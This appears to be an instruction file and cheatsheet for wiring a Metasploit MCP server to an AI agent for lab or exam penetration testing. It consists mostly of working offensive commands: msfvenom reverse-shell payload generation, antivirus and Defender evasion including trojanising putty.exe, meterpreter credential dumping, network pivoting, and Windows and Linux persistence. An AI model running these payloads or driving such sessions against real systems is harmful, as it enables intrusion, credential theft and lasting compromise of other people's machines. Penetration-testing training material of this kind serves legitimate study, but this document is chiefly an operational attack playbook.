# Metasploit MCP (`msfmcpd`) — Instructions & Cheatsheet

The shell handler and durable engagement state for the OSAI toolkit. Companion to
`MCP_INSTRUCTIONS.md` (setup) and the CLAUDE.md "Foothold sequence".

> **Golden rule:** all payload generation and all session work go through THIS server
> (`metasploit`). HexStrike's `metasploit_run` / `msfvenom_generate` are **never used** —
> they are one-shot subprocess calls with no session persistence (invisible to `msfmcpd`
> and `msfdb`).

---

## What it is
- In-framework MCP server shipped with Metasploit. **16 tools**, **stdio** (or http) transport.
- **Read-only by default.** Module execution + session write require `--enable-dangerous-actions`.
- Backed by **msfdb** (Postgres) → sessions, hosts, services, creds, loot survive `/clear` and
  are the durable engagement record. **One workspace per lab** (`workspace -a <LAB>`).
- Auto-detects / spawns the RPC server as needed. Rate-limited ~60 req/min. `msfdb init && msfdb start` required for DB tools.

## The 16 tools (know which need the dangerous flag)

| Tool | Category | Use |
|------|----------|-----|
| `msf_search_modules` | read | find modules by keyword/CVE/name |
| `msf_module_info` | read | full module details + options |
| `msf_host_info` | read | discovered hosts (msfdb) |
| `msf_service_info` | read | discovered services |
| `msf_vulnerability_info` | read | discovered vulns |
| `msf_note_info` | read | stored notes |
| `msf_credential_info` | read | discovered creds |
| `msf_loot_info` | read | collected loot / dumps |
| `msf_module_results` | read | results of a past module run (by UUID) |
| `msf_running_stats` | read | running/queued jobs snapshot |
| `msf_session_list` | read | active sessions |
| `msf_session_read` | read | non-destructively read pending session output |
| `msf_module_execute` | **DANGEROUS** | run a module as a background job (handlers, exploits, post, aux) |
| `msf_module_check` | **DANGEROUS** | run a module's `check` without exploiting |
| `msf_session_stop` | **DANGEROUS** | kill a session |
| `msf_session_write` | **DANGEROUS** | send input to an interactive session |

Register (Kali) — see `MCP_INSTRUCTIONS.md` §3:
```bash
claude mcp add --transport stdio --scope user metasploit \
  -- msfmcpd --user kapi --password <STRONG_PW> --enable-dangerous-actions
```

---

## How you actually drive it (natural language → tools)
You talk to Claude; Claude calls the tools. The MCP is async/job-based — an exploit or handler
runs as a *job*, and the session shows up in `msf_session_list` a moment later. So the pattern is
always **execute → poll list/read → act**, never "execute and assume".

- "Start a multi/handler for a windows x64 meterpreter reverse on tun0:4444, background it" → `msf_module_execute`
- "List sessions" / "read pending output from session 1" → `msf_session_list` / `msf_session_read`
- "Run `getuid` in session 1" → `msf_session_write` then `msf_session_read`
- "Search for an EternalBlue module" / "does host X look vulnerable?" → `msf_search_modules` / `msf_module_check`
- "What creds/loot/hosts are in the workspace?" → `msf_credential_info` / `msf_loot_info` / `msf_host_info`

**Token discipline:** prefer `msf_session_read` (pending output only) and the targeted `*_info`
queries over dumping everything. Read one session's output, not the whole console.

---

## Foothold flow (ties to CLAUDE.md "Foothold sequence")
1. **Raw shell first** — from the exploit/`/osai-revshell` (nc/HTTP/code-exec). Not MSF yet.
2. **Catch/upgrade into a Metasploit session:**
   - Catch a payload directly with a handler (below), OR
   - Upgrade an existing netcat shell: `sessions -u <id>` (runs `post/multi/manage/shell_to_meterpreter`).
3. **Persistence** (never lose it) — see Persistence below.
4. **Pivot** — Ligolo through the session, or MSF route+SOCKS (see /osai-pivot).
If a step fails via the MCP, log it and hand it to Kapi — don't loop.

---

## Handler cheatsheet (catch a shell)
Via `msf_module_execute` on `exploit/multi/handler` (or in msfconsole):
```
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST tun0        # tun0 = your Ligolo/VPN iface; use the reachable IP for the target
set LPORT 4444
set ExitOnSession false
run -j                # -j = background job, so it keeps catching
```
Match `PAYLOAD` exactly to what the target runs. Staged (`.../meterpreter/reverse_tcp`) vs
stageless (`.../meterpreter_reverse_tcp`) — stageless is more reliable through egress filtering.

## msfvenom payload cheatsheet (generate on Kali, serve from `www/`)
```bash
# Windows
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f exe    -o sh.exe
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=4444 -f exe    -o sh.exe   # stageless
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f dll    -o sh.dll
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f psh    -o sh.ps1
msfvenom -p windows/x64/shell_reverse_tcp       LHOST=<IP> LPORT=4444 -f exe    -o cmd.exe  # plain shell → upgrade later
# Linux
msfvenom -p linux/x64/meterpreter/reverse_tcp   LHOST=<IP> LPORT=4444 -f elf    -o sh.elf
msfvenom -p linux/x64/meterpreter_reverse_tcp   LHOST=<IP> LPORT=4444 -f elf    -o sh.elf   # stageless
# Web
msfvenom -p java/jsp_shell_reverse_tcp          LHOST=<IP> LPORT=4444 -f raw    -o sh.jsp
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f aspx   -o sh.aspx
msfvenom -p php/meterpreter/reverse_tcp         LHOST=<IP> LPORT=4444 -f raw    -o sh.php
# Shellcode (for your own loader)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f raw    -o sc.bin
# list: msfvenom --list payloads | grep meterpreter ; formats: msfvenom --list formats
```

## Obfuscation & AV evasion (msfvenom + MSF)
> Reality first: **default msfvenom output and encoders are heavily signatured** — they will trip
> Defender/most AV. Encoders defeat *bad-char/IDS* problems, NOT modern AV. For real evasion, emit
> **raw shellcode** and run it through a custom loader (`/osai-bypass` → Freeze/loader, AES/XOR wrap),
> or use a stageless payload + a signed template. The options below are the in-framework toolkit.

### Encoding (bad-chars / basic mangling — not AV bypass)
```bash
msfvenom -p <payload> LHOST=<IP> LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o e.exe   # 10 iterations
msfvenom -p <payload> ... -b '\x00\x0a\x0d\xff' -f exe -o e.exe                            # avoid bad chars
msfvenom -p <payload> --arch x64 --platform windows -e x64/xor_dynamic -f exe -o e.exe
msfvenom --list encoders | grep excellent
```

### Payload encryption (better than encoders — hides the shellcode body)
```bash
msfvenom -p <payload> LHOST=<IP> LPORT=4444 \
  --encrypt aes256 --encrypt-key 0123456789abcdef0123456789abcdef --encrypt-iv 0123456789abcdef \
  -f raw -o enc.bin
# --encrypt also supports: rc4 | xor | base64   (see: msfvenom --list encrypt)
```

### Embed in a legit binary (template injection)
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 \
  -x /path/putty.exe -k -f exe -o putty_evil.exe     # -x template, -k keep original functionality
```

### Payload options that help against AV / sandboxes (set on the handler or via msfvenom `OPTION=val`)
```
PrependMigrate=true PrependMigrateProc=svchost.exe   # migrate off the dropper immediately
EXITFUNC=thread                                       # don't kill the host process on exit
```
Prefer **stageless** (`windows/x64/meterpreter_reverse_tcp`) — no second-stage fetch for AV to catch,
and better through egress filtering.

### MSF evasion modules (Defender-aware generators)
```
use evasion/windows/windows_defender_exe
set PAYLOAD windows/x64/meterpreter/reverse_tcp ; set LHOST <IP> ; set LPORT 4444 ; run
use evasion/windows/windows_defender_js_hta          # .hta delivery
use evasion/windows/applocker_evasion_install_util   # AppLocker-constrained hosts
search evasion
```

### Format tricks for delivery / LOLBin execution
```bash
msfvenom -p <payload> ... -f psh-cmd  -o run.txt      # one-line PowerShell
msfvenom -p <payload> ... -f hta-psh  -o e.hta        # mshta delivery
msfvenom -p <payload> ... -f vbapplication -o e.vba   # macro
msfvenom -p <payload> ... -f dll      -o e.dll        # rundll32 / sideload (see /osai-bypass lolbin)
```

> Chain with `/osai-bypass` (AMSI/ETW/CLM/Defender/AV, custom loaders) and `/osai-upload`
> (magic bytes, polyglots) — those cover the evasion msfvenom can't. Verify a payload with
> DefenderCheck/ThreatCheck before you burn it on a target.

## Meterpreter command cheatsheet
```
sysinfo · getuid · getprivs · pgrep · ps · idletime
migrate <PID>            # move into a stable process
getsystem                # SYSTEM via known techniques
hashdump                 # SAM hashes (needs SYSTEM)
load kiwi ; creds_all    # in-memory credentials (mimikatz)
shell                    # drop to native shell   (Ctrl+Z / bg to background the session)
upload /kali/f C:\\path  ·  download C:\\path /kali/
execute -H -f prog.exe -a "args"     # -H hidden
run post/windows/gather/checkvm
```

## Pivoting via the session (see /osai-pivot for the full flow)
```
run autoroute -s 10.10.20.0/24        # route the subnet through this session
# OR:  use post/multi/manage/autoroute ; set SESSION <id> ; set SUBNET 10.10.20.0/24 ; run
use auxiliary/server/socks_proxy ; set SRVHOST 127.0.0.1 ; set SRVPORT 1080 ; set VERSION 5 ; run -j
#   → /etc/proxychains4.conf: socks5 127.0.0.1 1080  → proxychains4 <tool>
portfwd add -l 13389 -p 3389 -r 10.10.20.5           # local:13389 → target:3389
```
Prefer Ligolo (real TUN, no proxychains) when you can deliver the agent through the session.

## Persistence (never lose the connection)
```
# Windows
run post/windows/manage/persistence_exe            # or:
use exploit/windows/local/persistence_service ; set SESSION <id> ; run
use exploit/windows/local/registry_persistence ; set SESSION <id> ; run
# scheduled task (native, from a shell):  schtasks /create /sc onlogon /tn Upd /tr "C:\...\sh.exe"
# Linux
use exploit/linux/local/cron_persistence ; set SESSION <id> ; run
```
Also just re-catch: keep the `multi/handler` job running so a persistence beacon reconnects.

## DB / workspace (durable state)
```
workspace -a exam        # one per lab (osai-engage does this)
db_status                # confirm postgres
hosts · services · vulns · creds · loot · notes     # or the msf_*_info MCP tools
creds add user:pass ...  # mirror from /osai-cred-vault (json stays authoritative)
```

---

## Tool → task quick map
| I want to… | Tool / command |
|------------|----------------|
| catch a shell | `msf_module_execute` → `exploit/multi/handler … run -j` |
| see my shells | `msf_session_list` |
| run a command in a shell | `msf_session_write` + `msf_session_read` |
| upgrade nc → meterpreter | `sessions -u <id>` (shell_to_meterpreter) |
| check if a host is vulnerable | `msf_module_check` |
| find a module | `msf_search_modules` |
| read looted creds/hashes | `msf_credential_info` / `msf_loot_info` |
| pivot a subnet | autoroute + `socks_proxy` (or Ligolo via the session) |
| kill a session | `msf_session_stop` |

## Gotchas
- Async: execute → job; the session appears a beat later in `msf_session_list`. Poll, don't assume.
- Read-only without `--enable-dangerous-actions` — you can query but not run/drive. Register with the flag.
- Rate-limited (~60/min). Batch queries; don't spin.
- `msfdb init && msfdb start` or every `*_info` tool returns nothing.
- Keep one workspace per lab so hosts/creds/loot don't bleed between engagements.
